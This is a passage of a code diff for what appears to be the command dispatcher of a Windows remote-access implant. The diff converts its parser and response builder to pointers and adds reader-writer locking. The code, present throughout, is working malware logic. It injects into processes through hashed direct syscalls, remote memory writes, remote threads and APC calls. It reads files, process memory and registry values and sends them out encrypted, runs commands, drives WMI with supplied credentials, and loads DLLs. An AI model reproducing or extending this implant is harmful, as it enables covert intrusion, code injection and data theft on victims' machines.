@@ -19,27 +19,24 @@
 #include <cutils.h>
 #include <syscall_gate.hpp>
 #include <gdiscreen.hpp>
+#include <extapi.h>
 #include <iphlpapi.h>
 #include <netutils.h>
 #pragma comment(lib, "iphlpapi.lib")
 #pragma comment(lib, "ws2_32.lib")
 
-#define STANDART_EPILOGUE builder.padding(16); \
-						  auto out_data = builder.build(); \
-						  ctx->netio.send_encrypted_taskresponse(ctx, (char*)out_data.data(), out_data.size()); \
-						  out_data.~vector();
-
-#define PACK_GLE_STATUS	  builder.add_byte(bResult); \
-						  builder.add_int(GetLastError());
 
 std::vector<UCHAR> virtual_path;
+std::vector<PEXTENSION_OBJECT> extension_list;
 bool vpath_initialized = false;
 bool syscall_initialized = false;
 bool timeout_initialized = false;
+bool gsrwlock_initialized = false;
 int g_timeout = 0;
-std::vector<RPROCESS> proc_list;
+//std::vector<RPROCESS> proc_list;
 std::vector<PMEMORYMODULE> mapdll_list;
 std::vector<WmiLib*> wmi_session;
+SRWLOCK gSRWLock = { 0 };
 syslib* psyslib = NULL;
 
 
@@ -185,6 +182,10 @@ NTSTATUS handle_cmd(PMODULE_CONTEXT ctx) {
 	SetLastError(0);
 	psyslib = ctx->psyslib;
 	init_com();
+	if (!gsrwlock_initialized) {
+		InitializeSRWLock(&gSRWLock);
+		gsrwlock_initialized = true;
+	}
 	if (!vpath_initialized)
 	{
 		AES aes;
@@ -208,31 +209,31 @@ NTSTATUS handle_cmd(PMODULE_CONTEXT ctx) {
 		timeout_initialized = true;
 	}
 
-	auto parser = CommandParser();
-	auto builder = ResponseBuilder();
-	parser.load_data(ctx->userdata);
-	DWORD task_rid = parser.get_int();
+	auto parser = new CommandParser();
+	auto builder = new ResponseBuilder();
+	parser->load_data(ctx->userdata);
+	DWORD task_rid = parser->get_int();
 	ctx->random_id = task_rid;
 	//char a[256];
 	//sprintf(a, "ptr %p hex %x dec %d", ctx->userdata.data(), ctx->random_id, ctx->random_id);
 	//MessageBoxA(0, a, 0, 0);
-	DWORD code = parser.get_command();
+	DWORD code = parser->get_command();
 
 	if (code == 10) {
-		std::string env = parser.get_strarg();
+		std::string env = parser->get_strarg();
 		DWORD env_length = GetEnvironmentVariableA(env.c_str(), 0, 0);
 		LPSTR env_var = new char[env_length];
 		bool bResult = GetEnvironmentVariableA(env.c_str(), env_var, env_length);
 		PACK_GLE_STATUS
-			if (bResult) builder.add_strarg(env_var);
+			if (bResult) builder->add_strarg(env_var);
 		STANDART_EPILOGUE
 	}
 	if (code == 33) {
-		std::string path = parser.get_strarg();
-		DWORD access = parser.get_int() | SYNCHRONIZE;
-		DWORD disposition = parser.get_int();
-		DWORD attributes = parser.get_int();
-		DWORD options = parser.get_int() | 0x00000020;
+		std::string path = parser->get_strarg();
+		DWORD access = parser->get_int() | SYNCHRONIZE;
+		DWORD disposition = parser->get_int();
+		DWORD attributes = parser->get_int();
+		DWORD options = parser->get_int() | 0x00000020;
 		IO_STATUS_BLOCK block;
 		HANDLE hFile = 0;
 		OBJECT_ATTRIBUTES oa;
@@ -249,11 +250,11 @@ NTSTATUS handle_cmd(PMODULE_CONTEXT ctx) {
 		if (hFile == 0) bResult = 0;
 		PACK_NTSTATUS_STATUS
 
-			if (bResult) builder.add_int((DWORD)hFile);
+			if (bResult) builder->add_int((DWORD)hFile);
 		STANDART_EPILOGUE
 	}
 	if (code == 21) {
-		HANDLE hFile = (HANDLE)parser.get_int();
+		HANDLE hFile = (HANDLE)parser->get_int();
 
 		PCHAR file_buf = 0;
 		ULONG file_size = GetFile(file_buf, hFile);
@@ -262,17 +263,17 @@ NTSTATUS handle_cmd(PMODULE_CONTEXT ctx) {
 		if (file_size == -1) bResult = 0;
 		
 		PACK_GLE_STATUS
-		if (GetLastError() == 0) ctx->netio.send_encrypted_taskresponse_big(ctx, std::vector<UCHAR>(file_buf, file_buf + file_size), &builder);
+		if (GetLastError() == 0) ctx->netio.send_encrypted_taskresponse_big(ctx, std::vector<UCHAR>(file_buf, file_buf + file_size), builder);
 		delete[] file_buf;
 	}
 	if (code == 65)
 	{
-		HANDLE Handle = (HANDLE)parser.get_int();
+		HANDLE Handle = (HANDLE)parser->get_int();
 		bool bResult = 0;
 		NTSTATUS status = psyslib->nt_call_1arg(HASH_NtClose, Handle);
 		HANDLE_SYSCALL_RESULT
 		PACK_NTSTATUS_STATUS
-			builder.add_int(bResult);
+			builder->add_int(bResult);
 		STANDART_EPILOGUE
 	}
 	if (code == 87)
@@ -283,12 +284,12 @@ NTSTATUS handle_cmd(PMODULE_CONTEXT ctx) {
 		NTSTATUS status = ERROR_SUCCESS;
 		if (hHeap != INVALID_HANDLE_VALUE)
 		{
-			HANDLE Handle = (HANDLE)parser.get_int();
-			ULONGLONG fSize = parser.get_long();
+			HANDLE Handle = (HANDLE)parser->get_int();
+			ULONGLONG fSize = parser->get_long();
 			LPVOID buffer_ptr = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, fSize);
 			if (buffer_ptr)
 			{
-				memcpy(buffer_ptr, parser.get_str(fSize).data(), fSize);
+				memcpy(buffer_ptr, parser->get_str(fSize).data(), fSize);
 				writtenBytes = SaveFile((PUCHAR)buffer_ptr, fSize, Handle);
 				status = GetLastError();
 				if (status == ERROR_SUCCESS) bResult = 1;
@@ -297,16 +298,16 @@ NTSTATUS handle_cmd(PMODULE_CONTEXT ctx) {
 			HeapDestroy(hHeap);
 		}
 		PACK_NTSTATUS_STATUS
-			builder.add_long(writtenBytes);
+			builder->add_long(writtenBytes);
 		STANDART_EPILOGUE
 	}
 	if (code == 99)
 	{
 		BOOL bResult = 0;
 		HANDLE read, write;
-		std::string proc = parser.get_strarg();
-		std::string proc_args = parser.get_strarg();
-		int flags = parser.get_int();
+		std::string proc = parser->get_strarg();
+		std::string proc_args = parser->get_strarg();
+		int flags = parser->get_int();
 		auto struct_info_proc = run_process(proc + " " + proc_args, &read, &write, flags);
 		if (struct_info_proc.hProcess)
 		{
@@ -316,28 +317,28 @@ NTSTATUS handle_cmd(PMODULE_CONTEXT ctx) {
 		PACK_GLE_STATUS
 			if (struct_info_proc.hProcess)
 			{
-				builder.add_int(struct_info_proc.dwProcessId);
-				builder.add_int(struct_info_proc.dwThreadId);
-				builder.add_int((DWORD)struct_info_proc.hProcess);
-				builder.add_int((DWORD)struct_info_proc.hThread);
-				builder.add_int((DWORD)read);
-				builder.add_int((DWORD)write);
+				builder->add_int(struct_info_proc.dwProcessId);
+				builder->add_int(struct_info_proc.dwThreadId);
+				builder->add_int((DWORD)struct_info_proc.hProcess);
+				builder->add_int((DWORD)struct_info_proc.hThread);
+				builder->add_int((DWORD)read);
+				builder->add_int((DWORD)write);
 			}
 		STANDART_EPILOGUE
 	}
 	if (code == 135) {
-		int val = parser.get_int();
+		int val = parser->get_int();
 		PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY sp = {};
 		sp.MicrosoftSignedOnly = val;
 		BOOL bResult = SetProcessMitigationPolicy(ProcessSignaturePolicy, &sp, sizeof(sp));
 		PACK_GLE_STATUS
-			builder.add_byte(bResult);
+			builder->add_byte(bResult);
 		STANDART_EPILOGUE
 	}
 	if (code == 201) {
 		BOOL bResult = 0;
-		int pid = parser.get_int();
-		int access = parser.get_int();
+		int pid = parser->get_int();
+		int access = parser->get_int();
 		HANDLE hProcess = 0;
 		OBJECT_ATTRIBUTES oa;
 		CLIENT_ID cid = {(HANDLE)pid, 0};
@@ -346,27 +347,27 @@ NTSTATUS handle_cmd(PMODULE_CONTEXT ctx) {
 		NTSTATUS status = psyslib->nt_call(HASH_NtOpenProcess, &hProcess, access, &oa, &cid);
 		HANDLE_SYSCALL_RESULT
 		PACK_NTSTATUS_STATUS
-			builder.add_int((int)hProcess);
+			builder->add_int((int)hProcess);
 		STANDART_EPILOGUE
 	}
 	if (code == 79) {
 		BOOL bResult = 0;
-		int hProcess = parser.get_int();
+		int hProcess = parser->get_int();
 		HANDLE hToken = 0;
 		NTSTATUS status = 0;
-		int access = parser.get_int();
+		int access = parser->get_int();
 		status = psyslib->nt_call_3arg(HASH_NtOpenProcessToken, (HANDLE)hProcess, (PVOID)access, &hToken);
 		HANDLE_SYSCALL_RESULT
 		PACK_NTSTATUS_STATUS
-			builder.add_int((int)hToken);
+			builder->add_int((int)hToken);
 		STANDART_EPILOGUE
 	}
 	if (code == 123)
 	{
 		BOOL bResult = 0;
 		std::string s;
-		int hToken = parser.get_int();
-		int isUID = parser.get_int();
+		int hToken = parser->get_int();
+		int isUID = parser->get_int();
 		if (!isUID) {
 			s = TokenGetSID((HANDLE)hToken);
 		}
@@ -375,46 +376,46 @@ NTSTATUS handle_cmd(PMODULE_CONTEXT ctx) {
 		}
 		if (s.size() > 0) bResult = 1;
 		PACK_GLE_STATUS
-			builder.add_strarg(s);
+			builder->add_strarg(s);
 		STANDART_EPILOGUE
 	}
 	if (code == 210)
 	{
 		BOOL bResult = 0;
-		int hProcess = parser.get_int();
-		LONGLONG size = parser.get_long();
-		int alloctype = parser.get_int();
-		int protect = parser.get_int();
+		int hProcess = parser->get_int();
+		LONGLONG size = parser->get_long();
+		int alloctype = parser->get_int();
+		int protect = parser->get_int();
 		LONGLONG ptr = 0;
 		NTSTATUS status = 0;
 		status = psyslib->nt_call(HASH_NtAllocateVirtualMemory, (HANDLE)hProcess, &ptr, NULL, &size, alloctype, protect);
 		HANDLE_SYSCALL_RESULT
 		PACK_NTSTATUS_STATUS
-			builder.add_long(ptr);
+			builder->add_long(ptr);
 		STANDART_EPILOGUE
 	}
 	if (code == 211)
 	{
 
 		BOOL bResult = 0;
-		int hProcess = parser.get_int();
-		LONGLONG addr = parser.get_long();
-		LONGLONG size = parser.get_long();
-		int freetype = parser.get_int();
+		int hProcess = parser->get_int();
+		LONGLONG addr = parser->get_long();
+		LONGLONG size = parser->get_long();
+		int freetype = parser->get_int();
 		NTSTATUS status = 0;
 		status = psyslib->nt_call(HASH_NtFreeVirtualMemory, (HANDLE)hProcess, (LPVOID)&addr, &size, freetype);
 		HANDLE_SYSCALL_RESULT
 		PACK_NTSTATUS_STATUS
-			builder.add_byte(bResult);
+			builder->add_byte(bResult);
 		STANDART_EPILOGUE
 	}
 	if (code == 212)
 	{
 		BOOL bResult = 0;
-		int hProcess = parser.get_int();
-		LONGLONG addr = parser.get_long();
-		LONGLONG size = parser.get_long();
-		int protect = parser.get_int();
+		int hProcess = parser->get_int();
+		LONGLONG addr = parser->get_long();
+		LONGLONG size = parser->get_long();
+		int protect = parser->get_int();
 		DWORD old_protect = 0;
 		NTSTATUS status = 0;
 
@@ -422,7 +423,7 @@ NTSTATUS handle_cmd(PMODULE_CONTEXT ctx) {
 		HANDLE_SYSCALL_RESULT
 
 		PACK_NTSTATUS_STATUS
-			builder.add_int(old_protect);
+			builder->add_int(old_protect);
 		STANDART_EPILOGUE
 	}
 	if (code == 189) {
@@ -432,14 +433,14 @@ NTSTATUS handle_cmd(PMODULE_CONTEXT ctx) {
 		NTSTATUS status = ERROR_SUCCESS;
 		if (hHeap != INVALID_HANDLE_VALUE)
 		{
-			int Handle = parser.get_int();
-			ULONGLONG ptr = parser.get_long();
-			ULONGLONG mSize = parser.get_long();
+			int Handle = parser->get_int();
+			ULONGLONG ptr = parser->get_long();
+			ULONGLONG mSize = parser->get_long();
 			LPVOID buffer_ptr = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, mSize);
 			NTSTATUS status = 0;
 			if (buffer_ptr)
 			{
-				memcpy(buffer_ptr, parser.get_str(mSize).data(), mSize);
+				memcpy(buffer_ptr, parser->get_str(mSize).data(), mSize);
 				if ((HANDLE)Handle == (HANDLE)(-1))
 				{
 					memcpy((LPVOID)ptr, (LPVOID)buffer_ptr, mSize);
@@ -455,14 +456,14 @@ NTSTATUS handle_cmd(PMODULE_CONTEXT ctx) {
 			HeapDestroy(hHeap);
 		}
 		PACK_NTSTATUS_STATUS
-			builder.add_long(writtenBytes);
+			builder->add_long(writtenBytes);
 		STANDART_EPILOGUE
 	}
 	if (code == 190){
 		BOOL bResult = 0;
-		int hProcess = parser.get_int();
-		LONGLONG addr = parser.get_long();
-		LONGLONG size = parser.get_long();
+		int hProcess = parser->get_int();
+		LONGLONG addr = parser->get_long();
+		LONGLONG size = parser->get_long();
 		LONGLONG readed = 0;
 		NTSTATUS status = 0;
 		PCHAR buffer_ptr = new char[size];
@@ -478,17 +479,17 @@ NTSTATUS handle_cmd(PMODULE_CONTEXT ctx) {
 
 		PACK_NTSTATUS_STATUS
 
-			ctx->netio.send_encrypted_taskresponse_big(ctx, std::vector<UCHAR>(buffer_ptr, buffer_ptr + readed), &builder);
+			ctx->netio.send_encrypted_taskresponse_big(ctx, std::vector<UCHAR>(buffer_ptr, buffer_ptr + readed), builder);
 		delete[] buffer_ptr;
 	}
 	if (code == 176)
 	{
 		BOOL bResult = 0;
-		int hProcess = parser.get_int();
-		LONGLONG size = parser.get_long();
-		int secprotect = parser.get_int();
-		int pageprotect = parser.get_int();
-		int secattr = parser.get_int();
+		int hProcess = parser->get_int();
+		LONGLONG size = parser->get_long();
+		int secprotect = parser->get_int();
+		int pageprotect = parser->get_int();
+		int secattr = parser->get_int();
 		PSECTION_ALLOC lpSectionAlloc = SectionAlloc((HANDLE)hProcess, size, secprotect, pageprotect, secattr);
 		if (lpSectionAlloc)
 		{
@@ -497,8 +498,8 @@ NTSTATUS handle_cmd(PMODULE_CONTEXT ctx) {
 		PACK_GLE_STATUS
 			if (lpSectionAlloc)
 			{
-				builder.add_long(lpSectionAlloc->localSection);
-				builder.add_long(lpSectionAlloc->remoteSection);
+				builder->add_long(lpSectionAlloc->localSection);
+				builder->add_long(lpSectionAlloc->remoteSection);
 			}
 		STANDART_EPILOGUE
 	}
@@ -508,10 +509,10 @@ NTSTATUS handle_cmd(PMODULE_CONTEXT ctx) {
 		BOOL bResult = 0;
 		HANDLE hThread = 0;
 		NTSTATUS status = 0;
-		int hProcess = parser.get_int();
-		LONGLONG addr = parser.get_long();
-		LONGLONG param = parser.get_long();
-		int flags = parser.get_int();
+		int hProcess = parser->get_int();
+		LONGLONG addr = parser->get_long();
+		LONGLONG param = parser->get_long();
+		int flags = parser->get_int();
 		
 		CLIENT_ID cid;
 		PS_ATTRIBUTE_LIST lst;
@@ -530,21 +531,21 @@ NTSTATUS handle_cmd(PMODULE_CONTEXT ctx) {
 
 
 		PACK_NTSTATUS_STATUS
-			builder.add_int((int)hThread);
-		builder.add_int(tid);
+			builder->add_int((int)hThread);
+		builder->add_int(tid);
 		STANDART_EPILOGUE
 	}
 	if (code == 172)
 	{
 		BOOL bResult = 0;
-		int hProcess = parser.get_int();
-		LONGLONG addr = parser.get_long();
-		LONGLONG param = parser.get_int();
+		int hProcess = parser->get_int();
+		LONGLONG addr = parser->get_long();
+		LONGLONG param = parser->get_int();
 
 		bResult = ProcessStartApcRoutine((HANDLE)hProcess, (LPVOID)addr, (LPVOID)param);
 
 		PACK_GLE_STATUS
-			builder.add_byte(bResult);
+			builder->add_byte(bResult);
 		STANDART_EPILOGUE
 	}
 	if (code == 228)
@@ -552,24 +553,28 @@ NTSTATUS handle_cmd(PMODULE_CONTEXT ctx) {
 		BOOL bResult = 0;
 		WmiLib* swmi = new WmiLib;
 		NTSTATUS status = swmi->InitializeWmi();
+		AcquireSRWLockExclusive(&gSRWLock);
 		wmi_session.push_back(swmi);
+		ReleaseSRWLockExclusive(&gSRWLock);
 		if (SUCCEEDED(status))
 		{
 			bResult = 1;
 		}
 		PACK_NTSTATUS_STATUS
-			builder.add_byte(wmi_session.size() - 1);
+			AcquireSRWLockShared(&gSRWLock);
+			builder->add_byte(wmi_session.size() - 1);
+			ReleaseSRWLockShared(&gSRWLock);
 		STANDART_EPILOGUE
 	}
 	if (code == 229)
 	{
 		BOOL bResult = 0;
 		NTSTATUS status = 0;
-		int wmi_id = parser.get_int();
-		auto resource = parser.get_strarg();
-		auto user = parser.get_strarg();
-		auto passwd = parser.get_strarg();
-		auto authority = parser.get_strarg();
+		int wmi_id = parser->get_int();
+		auto resource = parser->get_strarg();
+		auto user = parser->get_strarg();
+		auto passwd = parser->get_strarg();
+		auto authority = parser->get_strarg();
 
 		PWCHAR w_user = (PWCHAR)user.c_str();
 		if (user.length() == NULL) w_user = NULL;
@@ -577,7 +582,7 @@ NTSTATUS handle_cmd(PMODULE_CONTEXT ctx) {
 		if (passwd.length() == NULL) w_passwd = NULL;
 		PWCHAR w_authority = (PWCHAR)authority.c_str();
 		if (authority.length() == NULL) w_authority = NULL;
-
+		AcquireSRWLockExclusive(&gSRWLock);
 		if (wmi_session.size() <= wmi_id || wmi_session.at(wmi_id)->released)
 		{
 			status = ERROR_INVALID_OPERATION;
@@ -590,18 +595,18 @@ NTSTATUS handle_cmd(PMODULE_CONTEXT ctx) {
 				bResult = 1;
 			}
 		}
-
+		ReleaseSRWLockExclusive(&gSRWLock);
 		PACK_NTSTATUS_STATUS
-			builder.add_byte(bResult);
+			builder->add_byte(bResult);
 		STANDART_EPILOGUE
 	}
 	if (code == 230)
 	{
 		NTSTATUS status = 0;
 		BOOL bResult = 0;
-		int wmi_id = parser.get_int();
-		auto query = parser.get_strarg();
-
+		int wmi_id = parser->get_int();
+		auto query = parser->get_strarg();
+		AcquireSRWLockExclusive(&gSRWLock);
 		if (wmi_session.size() <= wmi_id || wmi_session.at(wmi_id)->released)
 		{
 			status = ERROR_INVALID_OPERATION;
@@ -615,18 +620,19 @@ NTSTATUS handle_cmd(PMODULE_CONTEXT ctx) {
 			}
 		}
 
-
+		ReleaseSRWLockExclusive(&gSRWLock);
 		PACK_NTSTATUS_STATUS
-			builder.add_byte(bResult);
+			builder->add_byte(bResult);
 		STANDART_EPILOGUE
 	}
 	if (code == 234)
 	{
 		NTSTATUS status = 0;
 		BOOL bResult = 0;
-		int wmi_id = parser.get_int();
-		auto wmiclass = parser.get_strarg();
-		auto wmimethod = parser.get_strarg();
+		int wmi_id = parser->get_int();
+		auto wmiclass = parser->get_strarg();
+		auto wmimethod = parser->get_strarg();
+		AcquireSRWLockExclusive(&gSRWLock);
 		if (wmi_session.size() <= wmi_id || wmi_session.at(wmi_id)->released)
 		{
 			status = ERROR_INVALID_OPERATION;
@@ -639,17 +645,18 @@ NTSTATUS handle_cmd(PMODULE_CONTEXT ctx) {
 				bResult = 1;
 			}
 		}
-
+		ReleaseSRWLockExclusive(&gSRWLock);
 
 		PACK_NTSTATUS_STATUS
-			builder.add_byte(bResult);
+			builder->add_byte(bResult);
 		STANDART_EPILOGUE
 	}
 	if (code == 231)
 	{
 		BOOL bResult = 0;
 		NTSTATUS status = 0;
-		int wmi_id = parser.get_int();
+		int wmi_id = parser->get_int();
+		AcquireSRWLockExclusive(&gSRWLock);
 		if (wmi_session.size() <= wmi_id || wmi_session.at(wmi_id)->released)
 		{
 			status = ERROR_INVALID_OPERATION;
@@ -659,19 +666,20 @@ NTSTATUS handle_cmd(PMODULE_CONTEXT ctx) {
 			wmi_session.at(wmi_id)->ReleaseWmi();
 			bResult = 1;
 		}
-
+		ReleaseSRWLockExclusive(&gSRWLock);
 		PACK_NTSTATUS_STATUS
-			builder.add_byte(bResult);
+			builder->add_byte(bResult);
 		STANDART_EPILOGUE
 	}
 	if (code == 232)
 	{
 		BOOL bResult = 0;
-		int wmi_id = parser.get_int();
-		int flt_cnt = parser.get_int();
+		int wmi_id = parser->get_int();
+		int flt_cnt = parser->get_int();
 		std::vector<PWCHAR> flt;
 		std::vector<UCHAR> packed_result;
 		DWORD row_cnt = 0;
+		AcquireSRWLockExclusive(&gSRWLock);
 		if (wmi_session.size() <= wmi_id || wmi_session.at(wmi_id)->released)
 		{
 			SetLastError(ERROR_INVALID_OPERATION);
@@ -680,7 +688,7 @@ NTSTATUS handle_cmd(PMODULE_CONTEXT ctx) {
 		{
 			for (int i = 0; i < flt_cnt; i++)
 			{
-				std::string str_flt = parser.get_strarg();
+				std::string str_flt = parser->get_strarg();
 				PWCHAR _str_flt = new wchar_t[str_flt.size()];
 				_memcpy(_str_flt, (void*)str_flt.data(), str_flt.size());
 				flt.push_back(_str_flt);
@@ -691,11 +699,12 @@ NTSTATUS handle_cmd(PMODULE_CONTEXT ctx) {
 				bResult = 1;
 			}
 		}
+		ReleaseSRWLockExclusive(&gSRWLock);
 
 		PACK_GLE_STATUS
 
-			builder.add_int(row_cnt);
-		builder.add_bstrarg((char*)packed_result.data(), packed_result.size());
+			builder->add_int(row_cnt);
+		builder->add_bstrarg((char*)packed_result.data(), packed_result.size());
 
 		STANDART_EPILOGUE
 			flt.~vector();
@@ -703,11 +712,12 @@ NTSTATUS handle_cmd(PMODULE_CONTEXT ctx) {
 	if (code == 233)
 	{
 		BOOL bResult = 0;
-		int wmi_id = parser.get_int();
-		int flt_cnt = parser.get_int();
+		int wmi_id = parser->get_int();
+		int flt_cnt = parser->get_int();
 		std::vector<PWCHAR> flt;
 		std::vector<UCHAR> packed_result;
 		DWORD row_cnt = 0;
+		AcquireSRWLockExclusive(&gSRWLock);
 		if (wmi_session.size() <= wmi_id || wmi_session.at(wmi_id)->released)
 		{
 			SetLastError(ERROR_INVALID_OPERATION);
@@ -716,7 +726,7 @@ NTSTATUS handle_cmd(PMODULE_CONTEXT ctx) {
 		{
 			for (int i = 0; i < flt_cnt; i++)
 			{
-				std::string str_flt = parser.get_strarg();
+				std::string str_flt = parser->get_strarg();
 				PWCHAR _str_flt = new wchar_t[str_flt.size()];
 				_memcpy(_str_flt, (void*)str_flt.data(), str_flt.size());
 				flt.push_back(_str_flt);
@@ -727,11 +737,12 @@ NTSTATUS handle_cmd(PMODULE_CONTEXT ctx) {
 				bResult = 1;
 			}
 		}
+		ReleaseSRWLockExclusive(&gSRWLock);
 
 		PACK_GLE_STATUS
 
-			builder.add_int(row_cnt);
-		builder.add_bstrarg((char*)packed_result.data(), packed_result.size());
+			builder->add_int(row_cnt);
+		builder->add_bstrarg((char*)packed_result.data(), packed_result.size());
 
 		STANDART_EPILOGUE
 			flt.~vector();
@@ -741,16 +752,19 @@ NTSTATUS handle_cmd(PMODULE_CONTEXT ctx) {
 		AES aes;
 		BOOL bResult = 1;
 		PACK_GLE_STATUS
+			AcquireSRWLockShared(&gSRWLock);
 			std::vector<UCHAR> decrypted_vdir = aes.DecryptCBC(virtual_path, ctx->aes_key, ctx->iv);
-		builder.add_bstrarg((CHAR*)decrypted_vdir.data(), _wcslen((WCHAR*)decrypted_vdir.data())*2);
+			builder->add_bstrarg((CHAR*)decrypted_vdir.data(), _wcslen((WCHAR*)decrypted_vdir.data())*2);
+			ReleaseSRWLockShared(&gSRWLock);
 		STANDART_EPILOGUE
 	}
 	if (code == 164)
 	{
 		AES aes;
 		BOOL bResult = 0;
-		std::string new_vpath = parser.get_strarg();
+		std::string new_vpath = parser->get_strarg();
 		DWORD dwAttr = GetFileAttributesW((wchar_t*)new_vpath.c_str());
+		AcquireSRWLockShared(&gSRWLock);
 		if (dwAttr != INVALID_FILE_ATTRIBUTES) {
 			if ((dwAttr & FILE_ATTRIBUTE_DIRECTORY))
 			{
@@ -766,15 +780,15 @@ NTSTATUS handle_cmd(PMODULE_CONTEXT ctx) {
 		{
 			SetLastError(dwAttr);
 		}
-
+		ReleaseSRWLockShared(&gSRWLock);
 		PACK_GLE_STATUS
-			builder.add_byte(bResult);
+			builder->add_byte(bResult);
 		STANDART_EPILOGUE
 	}
 	if (code == 98)
 	{
 		BOOL bResult = 0;
-		BOOL detached = parser.get_byte();
+		BOOL detached = parser->get_byte();
 
 		if (detached)
 		{
@@ -786,11 +800,11 @@ NTSTATUS handle_cmd(PMODULE_CONTEXT ctx) {
 			HANDLE_SYSCALL_RESULT
 		}
 		else {
-			bResult = dll_load_routine(&parser);
+			bResult = dll_load_routine(parser);
 		}
 
 		PACK_GLE_STATUS
-			builder.add_byte(bResult);
+			builder->add_byte(bResult);
 
 		STANDART_EPILOGUE
 	}
@@ -798,16 +812,16 @@ NTSTATUS handle_cmd(PMODULE_CONTEXT ctx) {
 	{
 		BOOL bResult = 0;
 		HKEY key = 0;
-		DWORD pseudoKey = parser.get_int();
-		std::string wsubkey = parser.get_strarg();
-		DWORD access = parser.get_int();
+		DWORD pseudoKey = parser->get_int();
+		std::string wsubkey = parser->get_strarg();
+		DWORD access = parser->get_int();
 		LSTATUS status = RegOpenKeyExW((HKEY)pseudoKey, (LPWSTR)wsubkey.data(), 0, access, &key);
 		if (status == ERROR_SUCCESS) {
 			bResult = 1;
 		}
 
 		PACK_NTSTATUS_STATUS
-			builder.add_int((DWORD)key);
+			builder->add_int((DWORD)key);
 
 		STANDART_EPILOGUE
 	}
@@ -815,16 +829,16 @@ NTSTATUS handle_cmd(PMODULE_CONTEXT ctx) {
 	{
 		BOOL bResult = 0;
 		HKEY key = 0;
-		DWORD pseudoKey = parser.get_int();
-		std::string wsubkey = parser.get_strarg();
-		DWORD access = parser.get_int();
+		DWORD pseudoKey = parser->get_int();
+		std::string wsubkey = parser->get_strarg();
+		DWORD access = parser->get_int();
 		LSTATUS status = RegCreateKeyExW((HKEY)pseudoKey, (LPWSTR)wsubkey.data(), 0, 0, REG_OPTION_NON_VOLATILE, access, 0, &key, 0);
 		if (status == ERROR_SUCCESS) {
 			bResult = 1;
 		}
 
 		PACK_NTSTATUS_STATUS
-			builder.add_int((DWORD)key);
+			builder->add_int((DWORD)key);
 		STANDART_EPILOGUE
 	}
 	if (code == 251)
@@ -833,8 +847,8 @@ NTSTATUS handle_cmd(PMODULE_CONTEXT ctx) {
 		PBYTE outbuf = 0;
 		DWORD type = 0;
 		DWORD data_sz = 0;
-		DWORD pseudoKey = parser.get_int();
-		std::string wsubkey = parser.get_strarg();
+		DWORD pseudoKey = parser->get_int();
+		std::string wsubkey = parser->get_strarg();
 
 		LSTATUS status = RegQueryValueExW((HKEY)pseudoKey, (LPWSTR)wsubkey.data(), 0, 0, 0, &data_sz);
 		if (data_sz != 0) {
@@ -846,9 +860,9 @@ NTSTATUS handle_cmd(PMODULE_CONTEXT ctx) {
 		}
 
 		PACK_NTSTATUS_STATUS
-			builder.add_int((DWORD)type);
-		builder.add_int((DWORD)data_sz);
-		builder.add_bstrarg((PCHAR)outbuf, data_sz);
+			builder->add_int((DWORD)type);
+		builder->add_int((DWORD)data_sz);
+		builder->add_bstrarg((PCHAR)outbuf, data_sz);
 
 		STANDART_EPILOGUE
 	}
@@ -860,8 +874,8 @@ NTSTATUS handle_cmd(PMODULE_CONTEXT ctx) {
 		BOOL bResult = 0;
 		DWORD cSubKeys = 0;
 		DWORD cValues = 0;
-		DWORD pseudoKey = parser.get_int();
-		DWORD action_type = parser.get_byte();
+		DWORD pseudoKey = parser->get_int();
+		DWORD action_type = parser->get_byte();
 
 		LSTATUS status = RegQueryInfoKeyW(
 			(HKEY)pseudoKey,                    // key handle 
@@ -902,10 +916,10 @@ NTSTATUS handle_cmd(PMODULE_CONTEXT ctx) {
 			bResult = 1;
 		}
 		PACK_NTSTATUS_STATUS
-			builder.add_int(multi_str.size());
+			builder->add_int(multi_str.size());
 
 		for (std::wstring _str : multi_str) {
-			builder.add_bstrarg((PCHAR)_str.data(), _str.size() * 2);
+			builder->add_bstrarg((PCHAR)_str.data(), _str.size() * 2);
 		}
 
 		STANDART_EPILOGUE
@@ -913,24 +927,24 @@ NTSTATUS handle_cmd(PMODULE_CONTEXT ctx) {
 	if (code == 253)
 	{
 		BOOL bResult = 0;
-		DWORD pseudoKey = parser.get_int();
+		DWORD pseudoKey = parser->get_int();
 		LSTATUS status = RegCloseKey((HKEY)pseudoKey);
 		if (status == ERROR_SUCCESS) {
 			bResult = 1;
 		}
 
 		PACK_NTSTATUS_STATUS
-			builder.add_int(bResult);
+			builder->add_int(bResult);
 
 		STANDART_EPILOGUE
 	}
 	if (code == 248)
 	{
 		BOOL bResult = 0;
-		DWORD pseudoKey = parser.get_int();
-		std::string wvalue_name = parser.get_strarg();
-		DWORD value_type = parser.get_int();
-		std::string value_data = parser.get_strarg();
+		DWORD pseudoKey = parser->get_int();
+		std::string wvalue_name = parser->get_strarg();
+		DWORD value_type = parser->get_int();
+		std::string value_data = parser->get_strarg();
 
 		LSTATUS status = RegSetValueExW((HKEY)pseudoKey, (PWCHAR)wvalue_name.data(), 0, value_type, (const BYTE*)value_data.data(), value_data.size());
 		if (status == ERROR_SUCCESS) {
@@ -938,7 +952,7 @@ NTSTATUS handle_cmd(PMODULE_CONTEXT ctx) {
 		}
 
 		PACK_NTSTATUS_STATUS
-			builder.add_int(bResult);
+			builder->add_int(bResult);
 
 		STANDART_EPILOGUE
 	}
@@ -946,14 +960,14 @@ NTSTATUS handle_cmd(PMODULE_CONTEXT ctx) {
 	if (code == 247)
 	{
 		BOOL bResult = 0;
-		DWORD pseudoKey = parser.get_int();
+		DWORD pseudoKey = parser->get_int();
 
 		LSTATUS status = 0;
-		std::string wname = parser.get_strarg();
-		DWORD delete_type = parser.get_int();
+		std::string wname = parser->get_strarg();
+		DWORD delete_type = parser->get_int();
 		if (delete_type == 1)
 		{
-			status = RegDeleteKeyExW((HKEY)pseudoKey, (PWCHAR)wname.data(), parser.get_int(), 0);
+			status = RegDeleteKeyExW((HKEY)pseudoKey, (PWCHAR)wname.data(), parser->get_int(), 0);
 		}
 		else {
 			status = RegDeleteValueW((HKEY)pseudoKey, (PWCHAR)wname.data());
@@ -963,7 +977,7 @@ NTSTATUS handle_cmd(PMODULE_CONTEXT ctx) {
 		}
 
 		PACK_NTSTATUS_STATUS
-			builder.add_int(bResult);
+			builder->add_int(bResult);
 
 		STANDART_EPILOGUE
 	}
@@ -971,8 +985,8 @@ NTSTATUS handle_cmd(PMODULE_CONTEXT ctx) {
 	{
 		BOOL bResult = 0;
 		LONGLONG ptr = 0;
